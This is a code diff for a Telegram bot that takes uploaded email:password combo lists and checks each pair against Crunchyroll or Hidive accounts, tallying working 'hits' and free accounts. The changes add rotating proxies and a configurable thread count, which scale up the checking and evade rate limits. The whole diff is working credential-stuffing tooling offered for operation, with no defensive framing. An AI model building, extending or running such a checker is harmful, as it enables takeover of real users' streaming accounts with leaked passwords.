@@ -12,8 +12,9 @@ Flow
 3. On :class:`CallbackQuery`, a unique ``task_id`` is generated, the job
    is pushed to the :class:`TaskManager`, and the message is updated with
    the queued status.
-4. The worker processes each line, throttles status edits, and outputs
-   positive results dynamically.
+4. The worker processes each line using ``asyncio.to_thread`` with the
+   ``requests``-based checker modules, throttles status edits, and
+   outputs positive results dynamically.
 """
 
 from __future__ import annotations
@@ -25,7 +26,6 @@ from pathlib import Path
 from typing import Optional
 
 import aiofiles
-import aiohttp
 from pyrogram import Client, filters
 from pyrogram.errors import FloodWait, MessageNotModified
 from pyrogram.types import (
@@ -40,14 +40,13 @@ from bot.core.config import OWNER_ID, STATUS_INTERVAL, TEMP_DIR
 from bot.database.db import is_admin, is_authorized
 from bot.modules import crunchyroll as cr_mod
 from bot.modules import hidive as hd_mod
+from bot.modules.proxy import proxy_manager
 from bot.utils.logger import setup_logger
 from bot.utils.task_manager import task_manager
 
 log = setup_logger("handlers.files")
 
 # ── Processing-module registry ──────────────────────────────────────────
-# Each key is a callback-data identifier, and the value is a label shown
-# on the inline keyboard.  Add new modules here to extend the bot.
 MODULES: dict[str, str] = {
     "mod_cr": "🍥 Crunchyroll",
     "mod_hd": "📺 Hidive",
@@ -58,9 +57,6 @@ _CHECKERS = {
     "mod_cr": (cr_mod.check_account, cr_mod.format_hit, cr_mod.format_hit_line),
     "mod_hd": (hd_mod.check_account, hd_mod.format_hit, hd_mod.format_hit_line),
 }
-
-# Max concurrent HTTP checks within a single file-processing task.
-_INNER_CONCURRENCY = 10
 
 # Map of pending file paths keyed by "<user_id>:<message_id>".
 _pending_files: dict[str, str] = {}
@@ -98,7 +94,7 @@ async def _safe_edit(message: Message, text: str) -> None:
         except (FloodWait, MessageNotModified):
             pass
     except MessageNotModified:
-        pass  # Text hasn't actually changed; ignore.
+        pass
 
 
 # ── Document upload handler ─────────────────────────────────────────────
@@ -111,21 +107,18 @@ async def document_handler(_client: Client, message: Message) -> None:
     user_id = message.from_user.id
 
     if not await _is_allowed(user_id):
-        return  # Silently ignore unauthorized users.
+        return
 
     doc = message.document
 
-    # Validate file extension.
     if not doc.file_name or not doc.file_name.lower().endswith(".txt"):
         await message.reply_text("⚠️ Please upload a `.txt` file only.")
         return
 
-    # Validate file size (limit: 20 MB).
     if doc.file_size and doc.file_size > 20 * 1024 * 1024:
         await message.reply_text("⚠️ File too large. Maximum size is 20 MB.")
         return
 
-    # Download to temp directory.
     file_path = str(TEMP_DIR / f"{user_id}_{doc.file_name}")
     try:
         await message.download(file_name=file_path)
@@ -134,7 +127,6 @@ async def document_handler(_client: Client, message: Message) -> None:
         await message.reply_text("❌ Failed to download your file.")
         return
 
-    # Store reference and present module selection keyboard.
     sent = await message.reply_text(
         "📂 **File received!**\nSelect a processing module:",
         reply_markup=_build_module_keyboard(),
@@ -162,9 +154,7 @@ async def module_callback_handler(
     module_key = callback.data
     module_label = MODULES.get(module_key, module_key)
 
-    # Submit the job to the task manager.
     async def _cleanup() -> None:
-        """Remove the temp file associated with this task."""
         try:
             os.remove(file_path)
             log.info("Cleaned up temp file %s", file_path)
@@ -180,42 +170,25 @@ async def module_callback_handler(
         cleanup=_cleanup,
     )
 
+    proxy_info = f"🌐 **Proxies:** {proxy_manager.count}" if proxy_manager.count else "🌐 **Proxies:** None"
     await _safe_edit(
         callback.message,
         (
             f"⚙️ **Module:** {module_label}\n"
             f"🆔 **Task ID:** `{task_id}`\n"
+            f"🧵 **Threads:** {proxy_manager.threads}\n"
+            f"{proxy_info}\n"
             f"📌 **Status:** Queued"
         ),
     )
     await callback.answer("Task queued!")
     log.info(
         "Task %s created for module %s by user %s",
-        task_id,
-        module_key,
-        user_id,
+        task_id, module_key, user_id,
     )
 
 
 # ── File-processing worker ─────────────────────────────────────────────
-
-async def _check_single_line(
-    line: str,
-    check_func,
-    session: aiohttp.ClientSession,
-    semaphore: asyncio.Semaphore,
-) -> Optional[dict]:
-    """Parse and check a single email:password combo line."""
-    if ":" not in line:
-        return None
-    email, password = line.split(":", 1)
-    email = email.strip()
-    password = password.strip()
-    if not email or not password:
-        return None
-    async with semaphore:
-        return await check_func(email, password, session)
-
 
 async def _process_file(
     file_path: str,
@@ -223,7 +196,8 @@ async def _process_file(
     message: Message,
 ) -> None:
     """Read lines from *file_path* and process each through the selected
-    module.  Updates the Telegram message with throttled status edits.
+    module.  Uses ``asyncio.to_thread`` with a semaphore matching the
+    configured thread count.
     """
     module_label = MODULES.get(module_key, module_key)
     checker = _CHECKERS.get(module_key)
@@ -256,21 +230,32 @@ async def _process_file(
     errors = 0
     free = 0
     last_edit = 0.0
+    threads = proxy_manager.threads
 
     await _safe_edit(
         message,
         (
             f"⚙️ **Module:** {module_label}\n"
             f"📌 **Status:** Processing…\n"
+            f"🧵 **Threads:** {threads}\n"
             f"📊 **Progress:** 0/{total}"
         ),
     )
 
-    sem = asyncio.Semaphore(_INNER_CONCURRENCY)
+    sem = asyncio.Semaphore(threads)
 
-    async def _process_line(line: str) -> Optional[dict]:
-        """Check a single line and return the result (or None)."""
-        return await _check_single_line(line, check_func, session, sem)
+    async def _check_line(line: str) -> Optional[dict]:
+        """Parse and check a single email:password combo line."""
+        if ":" not in line:
+            return None
+        email, password = line.split(":", 1)
+        email = email.strip()
+        password = password.strip()
+        if not email or not password:
+            return None
+        proxy = proxy_manager.next()
+        async with sem:
+            return await check_func(email, password, proxy)
 
     async def _status_updater() -> None:
         """Periodically update the Telegram status message."""
@@ -285,41 +270,39 @@ async def _process_file(
                     (
                         f"⚙️ **Module:** {module_label}\n"
                         f"📌 **Status:** Processing…\n"
+                        f"🧵 **Threads:** {threads}\n"
                         f"📊 **Progress:** {checked}/{total}\n"
                         f"✅ **Hits:** {len(hits)} | 🆓 Free: {free} | ❌ Errors: {errors}"
                     ),
                 )
 
-    async with aiohttp.ClientSession(
-        cookie_jar=aiohttp.DummyCookieJar(),
-    ) as session:
-        # Launch the periodic status updater in the background.
-        updater = asyncio.create_task(_status_updater())
+    # Launch the periodic status updater in the background.
+    updater = asyncio.create_task(_status_updater())
 
-        # Process lines concurrently in batches.
-        for batch_start in range(0, total, _INNER_CONCURRENCY):
-            batch = lines[batch_start:batch_start + _INNER_CONCURRENCY]
-            tasks = [_process_line(line) for line in batch]
-            results = await asyncio.gather(*tasks, return_exceptions=True)
+    # Process lines concurrently in batches (sized to thread count).
+    for batch_start in range(0, total, threads):
+        batch = lines[batch_start:batch_start + threads]
+        tasks = [_check_line(line) for line in batch]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
 
-            for result in results:
-                checked += 1
-                if isinstance(result, BaseException):
-                    errors += 1
-                    log.debug("Error checking line: %s", result)
-                elif result is not None:
-                    if result.get("free"):
-                        free += 1
-                        free_accounts.append(result)
-                    else:
-                        hits.append(result)
+        for result in results:
+            checked += 1
+            if isinstance(result, BaseException):
+                errors += 1
+                log.debug("Error checking line: %s", result)
+            elif result is not None:
+                if result.get("free"):
+                    free += 1
+                    free_accounts.append(result)
+                else:
+                    hits.append(result)
 
-        # Stop the status updater.
-        updater.cancel()
-        try:
-            await updater
-        except asyncio.CancelledError:
-            pass
+    # Stop the status updater.
+    updater.cancel()
+    try:
+        await updater
+    except asyncio.CancelledError:
+        pass
 
     # ── Final summary ───────────────────────────────────────────────────
     hit_preview = "\n".join(
